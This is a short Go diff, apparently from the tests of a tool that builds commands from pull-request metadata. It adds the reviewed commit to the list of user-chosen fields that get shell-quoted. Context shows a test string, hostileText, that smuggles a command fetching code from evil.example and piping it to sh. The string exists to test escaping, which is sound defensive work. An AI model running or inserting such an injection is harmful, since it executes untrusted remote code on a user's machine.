@@ -673,11 +673,12 @@ const hostileText = `x;$(curl${IFS}-s${IFS}evil.example|sh) 'q' "d" ~ * # & | < 
 // chosenFields returns d's texts a repository, a pull request's author, a clone's own
 // config, or the user chose. The repository's owner and name, which GitHub keeps to
 // letters, digits, and -_., and the head commit, hex, are left out: those, and the number,
-// are the values a starter may put into a command as they are.
+// are the values a starter may put into a command as they are. The reviewed commit is in,
+// though the launcher hands a prompt only hex: a starter names it through shellquote.
 func chosenFields(d *Data) []*string {
 	return []*string{
-		&d.Title, &d.Author, &d.Labels, &d.DefaultBranch, &d.Remote, &d.Branch, &d.FailedChecks, &d.SensitiveFiles,
-		&d.Dependency, &d.FromVersion, &d.ToVersion, &d.Profile, &d.Me,
+		&d.Title, &d.Author, &d.Labels, &d.DefaultBranch, &d.Remote, &d.Branch, &d.ReviewedCommit, &d.FailedChecks,
+		&d.SensitiveFiles, &d.Dependency, &d.FromVersion, &d.ToVersion, &d.Profile, &d.Me,
 	}
 }
 
